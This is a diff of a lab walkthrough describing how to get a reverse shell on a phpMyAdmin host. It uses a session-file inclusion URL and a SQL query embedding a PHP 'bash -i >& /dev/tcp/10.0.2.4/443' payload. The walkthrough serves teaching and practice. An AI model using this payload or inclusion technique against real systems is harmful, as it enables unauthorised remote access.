@@ -56,9 +56,13 @@ To exploit this vulnerability it is necessary to:
 2) get the phpMyAdmin cookie
 3) run a SQL query
 4) edit the URL accurately.
+   
 Authentication was done with the credentials obtained previously.
+
 The phpMyAdmin cookie can be obtained by using the browser inspector and seeing what the value of the cookie named phpMyAdmin is.
+
 On the web page we are allowed to execute SQL queries.
+
 The normal functioning of the web application does not allow the interpretation and execution of code inserted in the backticks. However, by carefully structuring the URL and inserting a php script between backticks into a SQL query, it is possible to obtain the execution of the script.
 The URL must have the following format:
 http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/ php/session/sess_{cookieValue}
@@ -68,7 +72,7 @@ By listening to a netcat listener on port 443 and then injecting a SQL query lik
 select '<?php system("bash -i >& /dev/tcp/10.0.2.4/443 0>&1");?>'
 and by structuring the URL in the way illustrated, you obtain a reverse shell on the presidential machine.
 
-![Exploitation of the vulnerability](images/sql_vuln)
+![Exploitation of the vulnerability](images/sql_vuln.png)
 
 At this point you can authenticate with the admin user credentials extracted previously.
 
